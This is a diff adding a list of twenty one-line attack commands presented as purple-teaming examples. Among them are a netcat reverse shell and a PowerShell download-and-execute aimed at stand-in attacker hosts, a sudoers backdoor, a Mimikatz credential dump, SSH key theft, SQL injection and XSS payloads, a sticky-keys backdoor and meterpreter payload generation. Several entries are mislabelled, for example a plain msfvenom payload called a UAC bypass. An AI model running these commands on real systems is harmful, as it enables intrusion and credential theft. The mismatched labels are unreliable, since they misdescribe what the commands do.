@@ -1,0 +1,150 @@
+ 20 examples of shell code for a purple teaming exercise that has never been seen before
+
+ These examples are meant for educational and awareness purposes within a controlled environment. Please ensure you have proper authorization to use them.
+
+1. Reverse Shell Over DNS:
+
+shell
+
+# Red Team (Attack Simulation)
+nc -e /bin/sh attacker.com 53
+
+2. Fileless PowerShell Malware:
+
+shell
+
+# Red Team (Attack Simulation)
+powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/malware.ps1')"
+
+3. Linux Privilege Escalation:
+
+shell
+
+# Red Team (Attack Simulation)
+echo 'ALL ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/backdoor
+
+4. Mimikatz Credential Dump:
+
+shell
+
+# Red Team (Attack Simulation)
+mimikatz.exe "sekurlsa::logonPasswords"
+
+5. Exfiltration via ICMP Tunnel:
+
+shell
+
+# Red Team (Attack Simulation)
+ping -c 1 -p "data_to_exfiltrate" attacker.com
+
+6. SSH Key Theft:
+
+shell
+
+# Red Team (Attack Simulation)
+cp ~/.ssh/id_rsa /tmp/stolen_key
+
+7. WordPress SQL Injection:
+
+shell
+
+# Red Team (Attack Simulation)
+curl -d "username=admin' OR 1=1 --" http://vulnerable-wordpress.com/login
+
+8. Web Shell Upload:
+
+shell
+
+# Red Team (Attack Simulation)
+curl -F "file=@malicious.php" http://vulnerable-website.com/upload.php
+
+9. ARP Spoofing:
+
+shell
+
+# Red Team (Attack Simulation)
+arpspoof -i eth0 -t target_ip gateway_ip
+
+10. Kerberoasting:
+
+shell
+
+# Red Team (Attack Simulation)
+GetUserSPNs.py -request -dc-ip domain_controller_ip -user <user> -outputfile hashes
+
+11. Remote Desktop Protocol (RDP) Bruteforce:
+
+shell
+
+# Red Team (Attack Simulation)
+rdesktop -u user -p password -g 90% target_ip
+
+12. DNS Tunneling:
+
+shell
+
+# Red Team (Attack Simulation)
+dns2tcp -rattacker.com
+
+13. USB Rubber Ducky Attack (Windows):
+
+shell
+
+# Red Team (Attack Simulation)
+DuckEncoder.exe -i payload.txt -o inject.bin
+
+14. Malicious Word Macro:
+
+shell
+
+# Red Team (Attack Simulation)
+echo "Sub AutoOpen()" > malicious_macro.vba
+echo "MsgBox \"You've been hacked!\"" >> malicious_macro.vba
+echo "End Sub" >> malicious_macro.vba
+
+15. Sticky Keys Backdoor (Windows):
+
+shell
+
+# Red Team (Attack Simulation)
+ren C:\Windows\System32\sethc.exe sethc.bak
+copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+
+16. Port Knocking:
+
+shell
+
+# Red Team (Attack Simulation)
+nmap -p 1234 target_ip
+nmap -p 5678 target_ip
+nmap -p 9012 target_ip
+
+17. Cross-Site Scripting (XSS) Attack:
+
+shell
+
+# Red Team (Attack Simulation)
+curl -d "comment=<script>alert('XSS');</script>" http://vulnerable-website.com/comment
+
+18. Malicious Android App (APK):
+
+shell
+
+# Red Team (Attack Simulation)
+msfvenom -p android/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -o malicious.apk
+
+19. DNS Cache Poisoning:
+
+shell
+
+# Red Team (Attack Simulation)
+dnschef -i target_dns_ip -q -a attacker_ip
+
+20. Bypassing Windows UAC:
+
+shell
+
+# Red Team (Attack Simulation)
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker_ip LPORT=443 -f exe > payload.exe
+
+Please note that using these examples should be done responsibly and in a controlled environment. Unauthorized use of these techniques or attacks on real systems is illegal and unethical. Always ensure you have proper authorization and consent for security assessments and purple teaming exercises.
